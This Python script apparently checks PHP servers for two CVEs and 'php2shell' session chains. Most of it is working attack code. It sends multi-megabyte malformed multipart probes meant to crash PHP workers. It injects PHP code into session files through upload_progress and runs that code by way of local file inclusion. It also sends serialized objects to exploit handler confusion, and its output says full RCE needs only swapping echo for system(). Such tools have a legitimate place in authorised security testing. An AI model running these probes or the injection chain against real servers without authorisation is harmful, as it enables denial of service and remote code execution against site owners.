#!/usr/bin/env python3
"""
php2shell vulnerability checker
Checks for CVE-2026-109618, CVE-2026-109619 and the php2shell session chains.

Usage:
  python3 php2shellbt.py https://target.com
  python3 php2shellbt.py https://target.com --lfi "/vuln.php?page="
  python3 php2shellbt.py https://target.com --write-path /upload.php --read-path /api/data.php
  python3 php2shellbt.py https://target.com --all --lfi "/vuln.php?page=" --session-path /tmp/sessions/sess_
"""

import argparse
import random
import re
import string
import sys
import urllib.request
import urllib.parse
import ssl
import json
from functools import lru_cache
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlsplit, urlunsplit

# ── constants (merged from scanner.py) ───────────────────────────────────────

NESTED_KEYS = 62
PROBES = ((1, 4000), (8, 1020), (20, 1020))
CONTROL_BOUNDARY = "x"
CONTROL_BODY = b"--x\nContent-Disposition:name=a;filename=\n\n"
PROBE_BOUNDARY = ""
REJECTED_STATUSES = {400, 403, 411, 413, 414, 417, 422, 429, 431}
FIXED_VERSIONS = {(8, 2): 35, (8, 3): 36, (8, 4): 27, (8, 5): 12}
VERSION_PATTERN = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)")
PHPMYADMIN_PATH = "/show_config_errors.php"
PHPMYADMIN_MARKER = b"phpMyAdmin"
BODY_READ_LIMIT = 1 << 20  # 1 MiB

# ── helpers ───────────────────────────────────────────────────────────────────

RESET  = "\033[0m"
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"

VERIFY_TLS = True
FOLLOW_REDIRECTS = False
QUIET_JSON = False
USE_COLOR = sys.stdout.isatty()

def rand_base(n=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def color(text, c):
    return f"{c}{text}{RESET}" if USE_COLOR else text

def ok(msg):
    if not QUIET_JSON:
        print(color(f"[+] {msg}", GREEN))

def warn(msg):
    if not QUIET_JSON:
        print(color(f"[!] {msg}", YELLOW))

def err(msg):
    print(color(f"[-] {msg}", RED), file=sys.stderr)

def info(msg):
    if not QUIET_JSON:
        print(color(f"[*] {msg}", CYAN))


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(req.full_url, code, "redirect not allowed", headers, fp)


def ssl_context():
    ctx = ssl.create_default_context()
    if not VERIFY_TLS:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    return ctx


def request(url, method="GET", data=None, headers=None, timeout=10):
    """Returns (status, headers_dict, body_bytes). body is bytes, None on network error."""
    ctx = ssl_context()
    handlers = [urllib.request.HTTPSHandler(context=ctx)]
    if not FOLLOW_REDIRECTS:
        handlers.append(NoRedirect)
    opener = urllib.request.build_opener(*handlers)

    req = urllib.request.Request(url, data=data, method=method)
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    req.add_header("User-Agent", "Mozilla/5.0 php2shell-checker/1.0")

    try:
        with opener.open(req, timeout=timeout) as r:
            body = r.read(BODY_READ_LIMIT)
            resp_headers = dict(r.headers)
            status = r.status
    except urllib.error.HTTPError as e:
        body = e.read(BODY_READ_LIMIT)
        resp_headers = dict(e.headers)
        status = e.code
    except Exception as e:
        return None, {}, str(e).encode()

    return status, resp_headers, body


def multipart_body(boundary, fields):
    """Build a raw multipart/form-data body."""
    lines = []
    for name, value, filename, ctype in fields:
        lines.append(f"------{boundary}".encode())
        if filename:
            lines.append(
                f'Content-Disposition: form-data; name="{name}"; filename="{filename}"'.encode()
            )
            lines.append(f"Content-Type: {ctype}".encode())
        else:
            lines.append(f'Content-Disposition: form-data; name="{name}"'.encode())
        lines.append(b"")
        lines.append(value.encode() if isinstance(value, str) else value)
    lines.append(f"------{boundary}--".encode())
    return b"\r\n".join(lines)


def as_bytes(value) -> bytes:
    if isinstance(value, bytes):
        return value
    if isinstance(value, str):
        return value.encode("utf-8", errors="replace")
    return b""


def as_str(value) -> str:
    if isinstance(value, bytes):
        return value.decode("utf-8", errors="replace")
    return value or ""


def get_header(headers: dict, name: str) -> str:
    return headers.get(name) or headers.get(name.lower()) or ""


# ── probe building & verdict logic (from scanner.py) ─────────────────────────

@lru_cache(maxsize=len(PROBES))
def build_probe_body(size_mib: int, parts: int) -> bytes:
    """Build a large malformed multipart body with deeply nested array keys."""
    size = size_mib << 20
    name = b"a[]" + (b"[a]" * NESTED_KEYS)
    part = b"--\nContent-Disposition:name=" + name + b";filename=\n\n"
    base = part * parts
    if size < len(base):
        raise ValueError(
            f"php2shell probe of {size} bytes cannot hold {parts} parts ({len(base)} bytes)"
        )
    filler = (size - len(base)) // 3
    body = b"--\n" + (b"x:\n" * filler) + base[3:]
    return body[:-1]


def version_verdict(powered_by: str) -> Optional[str]:
    """Return 'FIXED', 'VULNERABLE', or None if version unknown/not in patch table."""
    match = VERSION_PATTERN.search(powered_by)
    if not match:
        return None
    major, minor, patch = (int(v) for v in match.groups())
    fixed_patch = FIXED_VERSIONS.get((major, minor))
    if fixed_patch is None:
        return None
    return "FIXED" if patch >= fixed_patch else "VULNERABLE"


def crash_signal(
    ctrl_status: Optional[int],
    ctrl_body: bytes,
    probe_status: Optional[int],
    probe_body: bytes,
    sapi: str,
) -> Tuple[Optional[str], Optional[str]]:
    """Detect crash signals by comparing probe vs control response."""
    if (
        b"Allowed memory size of " in probe_body
        and b" bytes exhausted" in probe_body
        and b"Unknown" in probe_body
    ):
        mode = (
            "PHP-FPM" if sapi == "fpm"
            else "mod_php" if sapi == "mod_php"
            else "mod_php/PHP-FPM"
        )
        return (
            mode,
            "in-band PHP fatal error (memory exhausted in Unknown) while parsing multipart body",
        )

    if probe_status == 500 and ctrl_body and not probe_body:
        mode = (
            "PHP-FPM" if sapi == "fpm"
            else "mod_php" if sapi == "mod_php"
            else "mod_php/PHP-FPM"
        )
        return (
            mode,
            "HTTP 500 with empty body although the control request produced output",
        )

    if sapi == "mod_php":
        return None, None

    if probe_status in (502, 503, 504):
        return (
            "PHP-FPM",
            f"HTTP {probe_status} from the web server fronting PHP-FPM (worker died mid-request)",
        )
    if probe_status == 200 and ctrl_body and not probe_body:
        return (
            "PHP-FPM",
            "HTTP 200 with empty body although the control request produced output (worker died mid-request)",
        )
    return None, None


# ── checks ────────────────────────────────────────────────────────────────────

def check_php_fingerprint(base_url, timeout=10):
    """CVE-2026-109619 — version fingerprint via X-Powered-By."""
    print()
    info("CHECK 1 — CVE-2026-109619: PHP version fingerprint (var_destroy UAF)")
    status, headers, body = request(base_url, timeout=timeout)
    if status is None:
        err(f"Request failed: {as_str(body)}")
        return False

    xpb = get_header(headers, "X-Powered-By")
    match = VERSION_PATTERN.search(xpb)

    if not match:
        warn("X-Powered-By header not present or does not expose PHP version.")
        warn("Site may not be PHP or header is hidden — CVE-2026-109619 inconclusive.")
        return False

    version = match.group(0).replace("PHP/", "")
    parts = tuple(int(x) for x in version.split("."))
    info(f"PHP version detected: {BOLD}{version}{RESET}")

    verdict = version_verdict(xpb)
    if verdict == "VULNERABLE":
        major = parts[0]
        if major == 5:
            warn(f"PHP {version} (5.x): Sury backported packages may carry the fix.")
            warn("  Sury 5.6.40-104+ ships the patches — verify the package version manually.")
        ok(f"VULNERABLE — PHP {version} is in the affected range for CVE-2026-109619.")
        ok("  Impact: var_destroy use-after-free reachable via unserialize() + destructor gadget.")
        return True
    elif verdict == "FIXED":
        info(f"PHP {version} is a patched release.")
        return False
    else:
        warn(f"PHP {version} branch not in known patch table — cannot determine status.")
        return False


def check_crash_probe(base_url, sapi="auto", timeout=60):
    """
    CVE-2026-109618/109619 — crash-probe detection (main method from scanner.py).
    Sends a control request, then large malformed multipart probes, and looks
    for crash signals in the difference between responses.
    Returns (vulnerable: bool, final_url: str).
    """
    print()
    info("CHECK 2 — CVE-2026-109618/109619: multipart crash-probe detection")
    target_url = base_url

    # Control request — minimal valid multipart
    info("  Sending control request...")
    ctrl_status, ctrl_hdrs, ctrl_body = request(
        target_url, method="POST",
        data=CONTROL_BODY,
        headers={
            "Content-Type": f"multipart/form-data; boundary={CONTROL_BOUNDARY}",
            "Content-Length": str(len(CONTROL_BODY)),
        },
        timeout=timeout,
    )
    if ctrl_status is None:
        err(f"Control request failed: {as_str(ctrl_body)}")
        return False, target_url

    if ctrl_status >= 500:
        warn(f"Control request returned HTTP {ctrl_status} — target may already be unstable.")
        return False, target_url

    # phpMyAdmin auto-detection → retarget to show_config_errors.php
    if PHPMYADMIN_MARKER in as_bytes(ctrl_body):
        parsed = urlsplit(target_url)
        target_url = urlunsplit((parsed.scheme, parsed.netloc, PHPMYADMIN_PATH, "", ""))
        info(f"  phpMyAdmin detected — retargeting to {target_url}")
        ctrl_status, ctrl_hdrs, ctrl_body = request(
            target_url, method="POST",
            data=CONTROL_BODY,
            headers={
                "Content-Type": f"multipart/form-data; boundary={CONTROL_BOUNDARY}",
                "Content-Length": str(len(CONTROL_BODY)),
            },
            timeout=timeout,
        )
        if ctrl_status is None:
            err(f"phpMyAdmin control request failed: {as_str(ctrl_body)}")
            return False, target_url

    powered_by = get_header(ctrl_hdrs, "X-Powered-By")
    ctrl_body_b = as_bytes(ctrl_body)

    # Pre-cache all probe bodies before the scan loop
    for probe in PROBES:
        build_probe_body(*probe)

    for index, (size_mib, parts) in enumerate(PROBES, start=1):
        info(f"  Probe {index}/{len(PROBES)}: {size_mib} MiB, {parts} parts, {NESTED_KEYS} nested keys...")
        try:
            probe_data = build_probe_body(size_mib, parts)
        except ValueError as exc:
            warn(f"  Probe {index} build failed: {exc}")
            continue

        probe_status, probe_hdrs, probe_body = request(
            target_url, method="POST",
            data=probe_data,
            headers={
                "Content-Type": f"multipart/form-data; boundary={PROBE_BOUNDARY}",
                "Content-Length": str(len(probe_data)),
            },
            timeout=timeout,
        )

        # Update X-Powered-By from probe response if available
        pb = get_header(probe_hdrs, "X-Powered-By")
        if pb:
            powered_by = pb

        if probe_status is None:
            warn(f"  Probe {index} failed to get a response: {as_str(probe_body)}")
            info("  (network error during probe could indicate a crash — treat as inconclusive)")
            continue

        if probe_status in REJECTED_STATUSES:
            warn(f"  Probe {index} rejected with HTTP {probe_status} — WAF/proxy body size limit.")
            break

        detected_sapi, signal = crash_signal(
            ctrl_status, ctrl_body_b,
            probe_status, as_bytes(probe_body),
            sapi,
        )
        if signal:
            ok(f"VULNERABLE — probe {index} ({size_mib} MiB, {parts} parts) crashed the request handler!")
            ok(f"  SAPI: {detected_sapi}")
            ok(f"  Signal: {signal}")
            ok("  CVE-2026-109618 / CVE-2026-109619 confirmed.")
            return True, target_url

        # Early exit if version reports fixed
        if powered_by and version_verdict(powered_by) == "FIXED":
            info(f"  No crash on probe {index} and X-Powered-By reports patched release: {powered_by}")
            return False, target_url

    # Post-loop version check
    if powered_by:
        verdict = version_verdict(powered_by)
        if verdict == "VULNERABLE":
            warn(f"  No crash signal observed but X-Powered-By reports unpatched release: {powered_by}")
            warn("  Crash may have been masked by error suppression — verify manually.")
        elif verdict == "FIXED":
            info(f"  No crash observed and X-Powered-By reports patched release: {powered_by}")
        else:
            info(f"  No crash signal. X-Powered-By: {powered_by}")
    else:
        info("  No crash signal detected and no PHP version advertised.")

    return False, target_url


def check_session_fixation(base_url, timeout=10):
    """CVE-2026-109618 — session upload_progress warning-based indicator check."""
    print()
    info("CHECK 2b — CVE-2026-109618: session.upload_progress warning indicators (display_errors=On)")

    marker   = rand_base(12)
    sid_bad  = f"nuclei/{rand_base(20)}"
    boundary = f"NucleiCVE{marker}"

    fields = [
        ("PHPSESSID",                   sid_bad,  None,              ""),
        ("PHP_SESSION_UPLOAD_PROGRESS", marker,   None,              ""),
        ("f",                           "Z",       f"{marker}.txt",  "text/plain"),
    ]
    body_bytes = multipart_body(boundary, fields)
    hdrs = {
        "Content-Type": f"multipart/form-data; boundary=----{boundary}",
        "Content-Length": str(len(body_bytes)),
    }

    status, resp_headers, body = request(base_url, method="POST",
                                          data=body_bytes, headers=hdrs, timeout=timeout)
    if status is None:
        err(f"Request failed: {as_str(body)}")
        return False

    body_str = as_str(body)
    indicator_a = "Session ID is too long or contains illegal characters" in body_str
    indicator_b = ("Failed to read session data" in body_str or
                   "PHP Request Startup" in body_str)

    if indicator_a and indicator_b:
        ok("VULNERABLE — PHP printed session-startup warnings, confirming upload_progress UAF/OOM path.")
        ok("  CVE-2026-109618: use-after-free / OOM triggered via upload_progress error path.")
        ok("  Chain: upload_progress injection → session file write → LFI → RCE (if cleanup=Off).")
        return True
    elif indicator_a:
        warn("Partial match — session ID warning triggered but no startup error visible.")
        warn("display_errors may be Off. Vulnerability may still exist — check via crash-probe.")
        return False
    else:
        info("No CVE-2026-109618 warning indicators found.")
        info("(display_errors=Off hides warnings even on vulnerable hosts — see CHECK 2 results.)")
        return False


def check_handler_mismatch(base_url, write_path, read_path, timeout=10, _quiet=False):
    """php2shell handler mismatch — session deserializer confusion."""
    if not _quiet:
        print()
        info("CHECK 3 — php2shell-handler-mismatch: session.serialize_handler confusion")
    info(f"  write_path = {write_path}  |  read_path = {read_path}")

    marker = rand_base(10)
    sid    = f"nuclei{rand_base(24)}"

    # Request 1: write a serialized object via php_serialize endpoint
    boundary_w = f"NucleiWrite{marker}"
    fields_w = [
        ("PHPSESSID",                   sid,    None,                        ""),
        ("PHP_SESSION_UPLOAD_PROGRESS", marker, None,                        ""),
        ("f",                           "Z",    f'x|O:8:"stdClass":0:{{}}',  "text/plain"),
    ]
    body_w = multipart_body(boundary_w, fields_w)
    hdrs_w = {
        "Content-Type": f"multipart/form-data; boundary=----{boundary_w}",
        "Content-Length": str(len(body_w)),
        "Cookie": f"PHPSESSID={sid}",
    }

    write_url = base_url.rstrip("/") + write_path
    status_w, _, body_w_resp = request(write_url, method="POST",
                                        data=body_w, headers=hdrs_w, timeout=timeout)
    if status_w is None:
        err(f"Write request failed: {as_str(body_w_resp)}")
        return False

    # Request 2: read session with php (non-serialize) endpoint to trigger deserializer confusion
    boundary_r = f"NucleiRead{marker}"
    fields_r = [
        ("PHPSESSID",                   sid,     None,         ""),
        ("PHP_SESSION_UPLOAD_PROGRESS", marker,  None,         ""),
        ("f",                           "Z",      "dummy.txt", "text/plain"),
    ]
    body_r = multipart_body(boundary_r, fields_r)
    hdrs_r = {
        "Content-Type": f"multipart/form-data; boundary=----{boundary_r}",
        "Content-Length": str(len(body_r)),
        "Cookie": f"PHPSESSID={sid}",
    }

    read_url = base_url.rstrip("/") + read_path
    status_r, _, body_r_resp = request(read_url, method="POST",
                                        data=body_r, headers=hdrs_r, timeout=timeout)
    if status_r is None:
        err(f"Read request failed: {as_str(body_r_resp)}")
        return False

    body_r_str = as_str(body_r_resp)
    indicator_a = "Failed to decode session object" in body_r_str
    indicator_b = "Session object destruction failed" in body_r_str

    if indicator_a or indicator_b:
        ok("VULNERABLE — handler mismatch deserialization error detected!")
        ok("  Destructor fires during error path — POP gadget can yield RCE.")
        ok("  Related CVE: CVE-2026-109618 / CVE-2026-109619.")
        return True
    else:
        info("No handler-mismatch indicators found.")
        info("Requires display_errors=On and endpoints with different serialize_handler settings.")
        return False


def check_session_lfi(base_url, lfi_path, session_save_path, timeout=10, _quiet=False):
    """php2shell session injection + LFI chain."""
    if not _quiet:
        print()
        info("CHECK 4 — php2shell-session-injection-lfi: session file injection + LFI")
    info(f"  lfi_path     = {lfi_path}")
    info(f"  session_path = {session_save_path}")

    marker = f"NUCLEI{rand_base(10)}"
    sid    = f"nuclei{rand_base(24)}"

    upload_boundary = f"Nuclei{marker}"
    php_payload = f"<?php echo '{marker}'; ?>"
    fields = [
        ("PHPSESSID",                   sid,    None,         ""),
        ("PHP_SESSION_UPLOAD_PROGRESS", marker, None,         ""),
        ("f",                           "Z",     php_payload, "text/plain"),
    ]
    body_bytes = multipart_body(upload_boundary, fields)
    hdrs = {
        "Content-Type": f"multipart/form-data; boundary=----{upload_boundary}",
        "Content-Length": str(len(body_bytes)),
        "Cookie": f"PHPSESSID={sid}",
    }

    status1, _, body1 = request(base_url, method="POST", data=body_bytes, headers=hdrs, timeout=timeout)
    if status1 is None:
        err(f"Upload request failed: {as_str(body1)}")
        return False

    session_file = f"{session_save_path}{sid}"
    lfi_url = base_url.rstrip("/") + lfi_path + urllib.parse.quote(session_file)
    status2, _, body2 = request(lfi_url, timeout=timeout)
    if status2 is None:
        err(f"LFI request failed: {as_str(body2)}")
        return False

    if marker in as_str(body2):
        ok("VULNERABLE — marker echoed back through LFI!")
        ok("  Marcador de prueba ejecutado (payload redactado).")
        ok("  Full RCE achievable by replacing echo with system()/passthru().")
        return True
    else:
        info("Marker not found in LFI response.")
        info("LFI path may be wrong, session.upload_progress.cleanup=On, or use_strict_mode=On.")
        return False


# ── summary ───────────────────────────────────────────────────────────────────

def print_banner(target):
    if QUIET_JSON:
        return
    print(color("""
╔══════════════════════════════════════════════════════════════╗
║           php2shell vulnerability checker                    ║
║  CVE-2026-109618 · CVE-2026-109619 · handler-mismatch · LFI ║
╚══════════════════════════════════════════════════════════════╝""", CYAN))
    print(f"  Target : {color(target, BOLD)}")
    print()

def print_summary(results):
    if QUIET_JSON:
        return
    print()
    print(color("══════════════ RESULTS ══════════════", BOLD))
    labels = {
        "cve109619":      "CVE-2026-109619 (version fingerprint / var_destroy UAF)",
        "cve109618_crash": "CVE-2026-109618/109619 (crash-probe — main detection)",
        "cve109618_warn":  "CVE-2026-109618 (session upload_progress warnings)",
        "handler":        "php2shell handler mismatch object injection",
        "session_lfi":    "php2shell session injection + LFI chain",
    }
    found = 0
    for key, label in labels.items():
        if key not in results:
            continue
        v = results[key]
        if v is True:
            print(f"  {color('VULNERABLE', GREEN)}  {label}")
            found += 1
        elif v is False:
            print(f"  {color('NOT FOUND', YELLOW)}  {label}")
        else:
            print(f"  {color('SKIPPED', YELLOW)}  {label}")
    print()
    if found:
        print(color(f"  ⚠  {found} vulnerability/ies confirmed — remediate immediately.", RED + BOLD))
    else:
        print(color("  ✓  No php2shell vulnerabilities confirmed.", GREEN))
    print()


# ── scan orchestration ────────────────────────────────────────────────────────

def scan_target(target, args):
    """Run only the selected checks against a single target. Returns results dict."""
    print_banner(target)
    results = {}
    checks = args._checks

    if "fingerprint" in checks:
        results["cve109619"] = check_php_fingerprint(target, timeout=args.timeout)

    if "crash" in checks:
        crash_vuln, _ = check_crash_probe(target, sapi=args.sapi, timeout=args.probe_timeout)
        results["cve109618_crash"] = crash_vuln

    if "warn" in checks:
        results["cve109618_warn"] = check_session_fixation(target, timeout=args.timeout)

    if "handler" in checks:
        info("CHECK 3 — php2shell-handler-mismatch")
        results["handler"] = check_handler_mismatch(
            target, args.write_path, args.read_path,
            timeout=args.timeout, _quiet=QUIET_JSON,
        )

    if "lfi" in checks:
        info("CHECK 4 — php2shell-session-injection-lfi")
        results["session_lfi"] = check_session_lfi(
            target, args.lfi, args.session_path,
            timeout=args.timeout, _quiet=QUIET_JSON,
        )

    return results


# ── CLI ───────────────────────────────────────────────────────────────────────

def main():
    global VERIFY_TLS, FOLLOW_REDIRECTS, QUIET_JSON, USE_COLOR
    parser = argparse.ArgumentParser(
        description="php2shell checker — CVE-2026-109618/109619 and session chains (copia parcheada)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  Comprobaciones ligeras:
    python3 php2shellbt.py https://target.com --checks fingerprint,crash,warn

  Solo avisos de sesión:
    python3 php2shellbt.py https://target.com --checks warn

  Cadena avanzada:
    python3 php2shellbt.py https://target.com --checks warn,handler,lfi \\
      --lfi "/vuln.php?page=" --session-path /tmp/sessions/sess_ \\
      --write-path /upload.php --read-path /api/data.php
""")
    parser.add_argument("target", help="Base URL de un único objetivo")
    parser.add_argument("--checks", default="fingerprint,crash,warn",
                        help="Checks separados por comas: fingerprint,crash,warn,handler,lfi")
    parser.add_argument("--all", action="store_true",
                        help="Ejecuta todos los checks (requiere rutas para handler/lfi)")
    parser.add_argument("--lfi", metavar="PATH",
                        help='Ruta LFI, por ejemplo "/vuln.php?page="')
    parser.add_argument("--session-path", metavar="PATH", default="/tmp/sessions/sess_",
                        help="Prefijo del fichero de sesión (por defecto: /tmp/sessions/sess_)")
    parser.add_argument("--write-path", metavar="PATH",
                        help="Endpoint con session.serialize_handler=php_serialize")
    parser.add_argument("--read-path", metavar="PATH",
                        help="Endpoint con session.serialize_handler=php")
    parser.add_argument("--timeout", type=int, default=10,
                        help="Timeout de peticiones ligeras (por defecto: 10)")
    parser.add_argument("--probe-timeout", type=int, default=60,
                        help="Timeout de crash-probes (por defecto: 60)")
    parser.add_argument("--sapi", choices=("auto", "mod_php", "fpm"), default="auto",
                        help="Modo SAPI para interpretar señales de crash")
    parser.add_argument("--json", action="store_true",
                        help="Salida JSON pura")
    parser.add_argument("--insecure", action="store_true",
                        help="Desactiva la verificación TLS (no recomendado)")
    parser.add_argument("--follow-redirects", action="store_true",
                        help="Permite redirecciones (desactivado por defecto)")
    parser.add_argument("--no-color", action="store_true",
                        help="Sin colores")
    args = parser.parse_args()

    valid = {"fingerprint", "crash", "warn", "handler", "lfi"}
    if args.all:
        checks = set(valid)
    else:
        checks = {c.strip() for c in args.checks.split(",") if c.strip()}
    if not checks:
        parser.error("--checks no puede estar vacío")
    invalid = checks - valid
    if invalid:
        parser.error(f"checks no válidos: {', '.join(sorted(invalid))}")
    if "handler" in checks and (not args.write_path or not args.read_path):
        parser.error("--checks handler requiere --write-path y --read-path")
    if "lfi" in checks and not args.lfi:
        parser.error("--checks lfi requiere --lfi")

    args._checks = checks
    VERIFY_TLS = not args.insecure
    FOLLOW_REDIRECTS = args.follow_redirects
    QUIET_JSON = args.json
    USE_COLOR = sys.stdout.isatty() and not args.no_color

    target = args.target.rstrip("/")
    results = scan_target(target, args)
    any_vuln = any(v is True for v in results.values())

    if args.json:
        out = {k: ("VULNERABLE" if v is True else "NOT_FOUND" if v is False else "SKIPPED")
               for k, v in results.items()}
        print(json.dumps({"target": target, "results": out}, indent=2))
    else:
        print_summary(results)

    sys.exit(1 if any_vuln else 0)


if __name__ == "__main__":
    main()
